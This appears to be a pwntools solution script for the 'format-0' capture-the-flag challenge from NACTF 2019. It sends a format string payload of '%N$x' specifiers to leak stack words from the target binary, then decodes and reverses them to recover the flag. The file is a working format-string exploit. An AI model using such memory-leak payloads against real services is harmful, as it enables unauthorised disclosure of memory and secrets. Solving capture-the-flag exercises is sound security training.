#!/usr/bin/env python3
from pwn import *

p = process('./format-0')
# p = remote('shell.2019.nactf.com', 31782)

payload = ''
for i in range(31, 35): # The flag is 16 characters (including new line) so we loop that many bytes.
    payload = '%' + str(i) + '$x' + payload
p.sendlineafter('Type something>', payload)

p.recvuntil(': ')

leak = str(p.recv())[3:-3] # Convert from bytes to string without decoding. We use -3 instead of -1 to also remove the newline character, which is taken literally as "\n". We use 3 instead of 2 because there is an extra junk character at the beginning.

flag = bytes.fromhex(leak).decode('utf-8')[::-1] # We need to reverse the flag because the bytes are reversed.

print(flag)
p.close()
